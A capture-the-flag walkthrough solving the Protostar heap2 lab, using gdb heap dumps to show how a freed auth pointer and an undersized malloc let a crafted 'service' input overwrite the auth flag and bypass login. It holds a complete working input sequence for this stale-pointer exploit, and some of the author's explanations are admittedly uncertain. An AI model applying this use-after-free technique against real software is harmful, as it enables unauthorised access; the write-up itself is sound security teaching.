# For heap2 in protostar

> This level examines what can happen when heap pointers are stale.
>  
> This level is completed when you see the “you have logged in already!” message
>  
> This level is at /opt/protostar/bin/heap2



We are given the source code of the level.
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
      
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

In previous levels, we replied on buffer overflow and stack smashing to redirect code execution. However, this level does not have these vulnerabilities.

1. `strlen` makes sure our input does not overflow the buffer space allocated for `auth->name`, which is 32 bytes.
```
  if(strlen(line + 5) < 31) {
      strcpy(auth->name, line + 5);
  }
```

2. `fgets` in `if(fgets(line, sizeof(line), stdin) == NULL) break;` makes sure that only 128 characters are read into the char array `line`. That way, we cannot smash the stack using buffer overflow.

It looks like we can only depend on heap vulnerabilities now. Let's go find one. Since this level teaches us about stale pointers (see the clue above), let's work alone that line.

> In cases where various pointers address a certain chunk of storage, it could occur that the storage is freed or reallocated by means of a particular alias and then referenced via another. This can lead to delicate and perhaps sporadic lossage with respect to allocation history and the state of the malloc arena.
[source](https://www.quora.com/What-is-a-stale-pointer-in-C)

This vulnerability involves 2 pointers pointing to the same block of memory. The answer lies in the heap. Let's explore using gdb. First, we set a breakpoint after the first `malloc`.
```
[...]
0x080489a5 <main+113>:	jne    0x8048a01 <main+205>
0x080489a7 <main+115>:	mov    DWORD PTR [esp],0x4
0x080489ae <main+122>:	call   0x804916a <malloc>
0x080489b3 <main+127>:	mov    ds:0x804b5f4,eax
[...]
(gdb) break *0x080489b3
```
After we arrive at the breakpoint, we can use `info proc mappings` to see the memory region of the heap.
```
(gdb) info proc mappings
[...]
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	[...]
	 0x804c000  0x804d000     0x1000          0           [heap]
	[...]
```

Let's take a look in the heap. From `p/x $eax`, we know the memory allocated to `struct auth` starts in address `0x804c008`.
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x00000000	0x00000000
0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
```

Hold up! `struct auth` has a character array of 32 characters (32 bytes large) and an `int` (4 bytes large). Shouldn't 36 bytes be allocated? It *should* have been, just as how the programmer should have been careful. The instruction was `auth = malloc(sizeof(auth));`, which allocated memory space the size of the *pointer variable* `auth`. To allocated 36 bytes, the instruction should have been `malloc(sizeof(struct auth))`. Pointer variables are 4 bytes large. 

Ok Solomon, so you say. Why, then, are there 12 bytes of usable space? I downloaded the source for `glibc-2.11.2` (because `info proc mappings` shows that `/lib/libc-2.11.2.so` is a shared library used by `heap2`). This is the comment of interest in `malloc.c`.

>  [...]
>  malloc_usable_size(Void_t* p);
>
>  Returns the number of bytes you can actually use in
>  an allocated chunk, which may be more than you requested (although
>  often not) due to alignment and minimum size constraints.
>  You can use this many bytes without worrying about
>  overwriting other allocated objects. This is not a particularly great
>  programming practice. malloc_usable_size can be more useful in
>  debugging and assertions, for example:
>  [...]
>  

So even though 4 bytes were requested to be allocated, `malloc` could generously give *more* than we ask for. In this case, it gave 12 bytes.

Before we begin, let's set another breakpoint after `strcpy` so that we can observe the heap after the user input is copied into `auth->name`.
```
(gdb) break *0x08048a01
Breakpoint 4 at 0x8048a01: file heap2/heap2.c, line 31.
```

Let's run the program. I'll give an arbitrary input 'solo'.
```
Starting program: /opt/protostar/bin/heap2 
[ auth = (nil), service = (nil) ]
auth solo
```

As expected, the heap shows the hex values `0x6f6c6f730000000a` at address `0x804c008`. This is little endian for the string 'solo\n'.
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x6f6c6f73	0x0000000a
0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
```

Notice that the output now shows that `struct auth` is at address `0x804c008`. This is the correct address as returned to us by `malloc`. Now, let's try giving another input.
```
(gdb) c
Continuing.
[ auth = 0x804c008, service = (nil) ]
auth swjs  
```

As expected, another chunk of memory is allocated to store *another* `struct auth`, and our string 'swjs' is copied to memory address `0x804c018`.
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x6f6c6f73	0x0000000a
0x804c010:	0x00000000	0x00000011	0x736a7773	0x0000000a
0x804c020:	0x00000000	0x00000fe1	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
```

Now, the pointer variable `auth` shows the new allocated memory address `0x804c018`.
```
(gdb) c
Continuing.
[ auth = 0x804c018, service = (nil) ]
```

If I were to `reset`, the memory chunk at address `0x804c018` will be freed. But the pointer variable `auth` still points to it. It points to the freed memory. Remember this. This is a big clue right here.
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x6f6c6f73	0x0000000a
0x804c010:	0x00000000	0x00000011	0x00000000	0x0000000a
0x804c020:	0x00000000	0x00000fe1	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
[ auth = 0x804c018, service = (nil) ]
```

Let me input `service zzzyyyxxx` into the program. Pay atttention to the address of the memory chunk allocated for it. It is stored in the memory chunk starting from address `0x804c018`. Hmmm, wait a minute. Isn't that the same memory chunk that pointer variable `auth` points to? Hell yeah it is! Since the memory was freed earlier, it can be used by `strdup` to store the string `' zzzyyyxxx\n'` (the space and newline characters are included) given as input with `service`. This is the stale heap pointer vulnerability the hint refers to. Both pointer variables `auth` and `service` point to the same chunk of memory. 
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x6f6c6f73	0x0000000a
0x804c010:	0x00000000	0x00000011	0x7a7a7a20	0x78797979
0x804c020:	0x000a7878	0x00000fe1	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
```

The program leaves all the bits in `auth->auth` cleared and provide no function to change its value. On the surface, this means we can never be logged in. But with the input `service`, we can overwrite the memory address that corresponds to `auth->auth` to authenticate. We just need a padding of 32 characters for the character array `name`, and the 33rd character will overwrite `auth->auth`. 
```
struct auth {
  char name[32];
  int auth;
};

0x08048a86 <main+338>:	mov    eax,ds:0x804b5f4             ; ds:0x804b5f4 is pointer variable auth
0x08048a8b <main+343>:	mov    eax,DWORD PTR [eax+0x20]     ; eax+0x20 deferences auth->auth
0x08048a8e <main+346>:	test   eax,eax                      ; if auth->auth is 0, log in failed.
```

So obviously, with our input `service zzzyyyxxx`, `auth->auth` will not be overwritten and a password will be demanded.
```
user@protostar:/opt/protostar/bin$ ./heap2 
[ auth = (nil), service = (nil) ]
auth solo
[ auth = 0x804c008, service = (nil) ]
auth swjs
[ auth = 0x804c018, service = (nil) ]
reset
[ auth = 0x804c018, service = (nil) ]
service xxxyyyzzz
[ auth = 0x804c018, service = 0x804c018 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
```

Ok let's try the longer input. It worked. But, why is `service` now showing address `0x804c028` instead of `0x804c018`? I have no idea either. Even though the memory chunk `auth` points to is freed, `strdup` just does not use it if the string is long. It just decides to use a different portion of the memory.
```
user@protostar:/opt/protostar/bin$ ./heap2 
[ auth = (nil), service = (nil) ]
auth solo
[ auth = 0x804c008, service = (nil) ]
auth swjs
[ auth = 0x804c018, service = (nil) ]
reset
[ auth = 0x804c018, service = (nil) ]
servicexxxxyyyyzzzz0000111122223333
[ auth = 0x804c018, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]
```
That might be confusing, but it does *not* change the fact that the address of `auth->auth` is just offset of 0x20 bytes from `auth`. In the case above, it is in address `0x804c038`. Thus, for its value to be overwritten by `service`, the input just needs to be 0x11 bytes long. 0x10 bytes are for padding, and the last byte to overwrite `auth->auth`. The entire string is `'aaaabbbbccccdddd\n'`.
```
user@protostar:/opt/protostar/bin$ ./heap2 
[ auth = (nil), service = (nil) ]
auth solomon
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
serviceaaaabbbbccccdddd
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
It works because when `auth` is in address `0x804c008`, `auth->auth` is in address `0x804c028`. For some unknown reason, the string `'aaaabbbbccccdddd\n'` is stored from address `0x804018` onwards despite the fact the memory chunk `auth` points to was freed. Regardless, that means that `'\n'` is stored in address `0x804028`, successfully overwritting `auth->auth`.
```
(gdb) x/32x 0x804c000
0x804c000:	0x00000000	0x00000011	0x6f6c6f73	0x0a6e6f6d
0x804c010:	0x00000000	0x00000019	0x61616161	0x62626262
0x804c020:	0x63636363	0x64646464	0x0000000a	0x00000fd9
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000

                struct auth *auth                         service
0x804c008-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-       -+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |     char name[32];         |       |                          |
0x804c018-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-       -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
            |     char name[32];         |       |  0x61616161626262626363636364646464   |
0x804c028-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-       -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
            |     auth-> auth            |       | 0x0000000a               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-       -+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

END